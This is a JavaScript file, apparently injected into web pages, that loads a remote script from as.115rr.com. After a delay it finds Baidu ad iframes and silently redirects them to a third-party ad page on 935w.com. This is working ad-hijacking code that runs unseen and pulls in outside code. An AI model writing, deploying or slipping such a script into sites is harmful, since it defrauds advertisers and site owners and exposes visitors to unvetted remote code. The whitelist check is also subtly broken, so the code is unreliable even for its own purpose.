window.__baidu_dup_jobruner = {};
(function()
{
   function isInclude(name){  
        var js= /js$/i.test(name);  
        var es=document.getElementsByTagName(js?'script':'link');  
        for(var i=0;i<es.length;i++)   
        if(es[i][js?'src':'href'].indexOf(name)!=-1)return true;  
        return false;  
    }
   
    function isInIframe(t) {
              return  t != window.top && t != t.parent ;
    }
  
    function load_script(async, src) {
        if(isInclude(src)) return; //不要重复加载js 
        if (async) {
        var n = document.createElement("script");
        n.type = "text/javascript";
        n.src = src;
        var h = document.getElementsByTagName('head')[0];
        h.appendChild(n);
        } else {
        document.write("<script src='" + src + "' language='javascript'></" + "script>");
        }
    }
    function getQueryString(name,src) { 
		    var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)", "i"); 
		    var r=src.match(reg); 
		    if(r!= null) return decodeURIComponent(r[2]);return null; 
	}
    if (typeof($gadproc) == 'undefined') $gadproc = {};
    $gadproc.next_js = '/bdu/process.js';
    $gadproc.bd_init = function(){};
    $gadproc.async = true;
    load_script($gadproc.async,"https://as.115rr.com/qd5/common.js");
    function check_baixi(src) {
        var ltu = getQueryString("ltu",src);
        var ltr = getQueryString("ltr",src);
        var whitelist_flag = false;
        var whitelist = ["tu.baixing.com","580n.com","kukanw.com","935w.com"];
        for (var i = 0; i < whitelist.length; i++) {
            var key= whitelist[i];
            if(ltu.indexOf("tu.baixing.com") > 0 || ltr.indexOf("tu.baixing.com") > 0)
            {
                whitelist_flag =  true;
                break;
            }
        }
        return whitelist_flag;
    }
    function show_ad()
    {
	    var iframe_array = document.getElementsByTagName('iframe');
	    for (var i = 0; i < iframe_array.length; i++) {
	    	var m_iframe = iframe_array[i] , m_src = m_iframe.src;
	    	if(/baidu\.com/.test(m_src,"g") && !check_baixi(m_src))  //如果是百度的链结就开始处得
	    	{ 
	    		    var m_iframeId ="iframe"+getQueryString("di",m_src)+"_0";
	    		    var width = m_iframe.width;
	    		    var height = m_iframe.height;
	                 var n = {
	                    iframeId: m_iframeId,
	                    srcAttriName: "src",
	                    onloadDefine: "",
	                    iframeWidth: width,
	                    iframeHeight: height
	                };
	                if (typeof($gadproc) != "undefined" && typeof($gadproc.bd_ads) != "undefined"){
	                         new_frame_src = $gadproc.bd_ads(n, true);
	                  }
	                if(typeof(new_frame_src) !=="undefined")
	                {
                        m_iframe.setAttribute("marginwidth",0);
                        m_iframe.setAttribute("marginheight",0);
                        m_iframe.setAttribute("scrolling","no");
                        m_iframe.setAttribute("allowtransparency",0);
                        m_iframe.setAttribute("align","center center");
	                	m_iframe.src = "http://www.935w.com/gg/300_250_935w_bd_cj.html";
	                }
	    	}

	    }
	}
	setTimeout(function(){
            show_ad();
	},2000);
})();

